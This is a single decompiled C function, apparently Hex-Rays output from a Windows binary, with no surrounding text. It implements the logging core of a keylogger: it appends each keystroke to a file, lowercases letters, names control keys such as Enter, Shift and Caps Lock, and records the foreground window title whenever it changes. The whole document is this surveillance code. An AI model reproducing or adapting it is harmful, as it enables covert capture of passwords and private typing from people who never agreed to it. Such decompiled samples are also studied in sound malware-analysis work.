HANDLE __cdecl sub_4010C7(int Buffer)
{
  HANDLE result; // eax
  HWND v2; // eax
  DWORD v3; // eax
  DWORD v4; // eax
  DWORD v5; // eax
  HANDLE hFile; // [esp+4h] [ebp-8h]
  DWORD NumberOfBytesWritten; // [esp+8h] [ebp-4h]

  NumberOfBytesWritten = 0;
  result = CreateFileA(FileName, 0x40000000u, 2u, 0, 4u, 0x80u, 0);
  hFile = result;
  if ( result != (HANDLE)-1 )
  {
    SetFilePointer(result, 0, 0, 2u);
    v2 = GetForegroundWindow();
    GetWindowTextA(v2, ::Buffer, 1024);
    if ( strcmp(byte_405350, ::Buffer) )
    {
      WriteFile(hFile, aWindow, 0xCu, &NumberOfBytesWritten, 0);
      v3 = strlen(::Buffer);
      WriteFile(hFile, ::Buffer, v3, &NumberOfBytesWritten, 0);
      WriteFile(hFile, asc_40503C, 4u, &NumberOfBytesWritten, 0);
      strncpy(byte_405350, ::Buffer, 0x3FFu);
      byte_40574F = 0;
    }
    if ( (unsigned int)Buffer < 0x27 || (unsigned int)Buffer > 0x40 )
    {
      if ( (unsigned int)Buffer <= 0x40 || (unsigned int)Buffer >= 0x5B )
      {
        switch ( Buffer )
        {
          case 8:
            v4 = strlen(aBackspace);
            WriteFile(hFile, aBackspace_0, v4, &NumberOfBytesWritten, 0);
            break;
          case 9:
            WriteFile(hFile, aTab, 5u, &NumberOfBytesWritten, 0);
            break;
          case 13:
            WriteFile(hFile, aEnter, 8u, &NumberOfBytesWritten, 0);
            break;
          case 16:
            WriteFile(hFile, aShift, 7u, &NumberOfBytesWritten, 0);
            break;
          case 17:
            WriteFile(hFile, aCtrl, 6u, &NumberOfBytesWritten, 0);
            break;
          case 20:
            v5 = strlen(aCapsLock);
            WriteFile(hFile, aCapsLock_0, v5, &NumberOfBytesWritten, 0);
            break;
          case 32:
            WriteFile(hFile, asc_405074, 1u, &NumberOfBytesWritten, 0);
            break;
          case 46:
            WriteFile(hFile, aDel, 5u, &NumberOfBytesWritten, 0);
            break;
          case 96:
            WriteFile(hFile, a0, 1u, &NumberOfBytesWritten, 0);
            break;
          case 97:
            WriteFile(hFile, a1, 1u, &NumberOfBytesWritten, 0);
            break;
          case 98:
            WriteFile(hFile, a2, 1u, &NumberOfBytesWritten, 0);
            break;
          case 99:
            WriteFile(hFile, a3, 1u, &NumberOfBytesWritten, 0);
            break;
          case 100:
            WriteFile(hFile, a4, 1u, &NumberOfBytesWritten, 0);
            break;
          case 101:
            WriteFile(hFile, a5, 1u, &NumberOfBytesWritten, 0);
            break;
          case 102:
            WriteFile(hFile, a6, 1u, &NumberOfBytesWritten, 0);
            break;
          case 103:
            WriteFile(hFile, a7, 1u, &NumberOfBytesWritten, 0);
            break;
          case 104:
            WriteFile(hFile, a8, 1u, &NumberOfBytesWritten, 0);
            break;
          case 105:
            WriteFile(hFile, a9, 1u, &NumberOfBytesWritten, 0);
            break;
          default:
            break;
        }
      }
      else
      {
        Buffer += 32;
        WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, 0);
      }
    }
    else
    {
      WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, 0);
    }
    result = (HANDLE)CloseHandle(hFile);
  }
  return result;
}
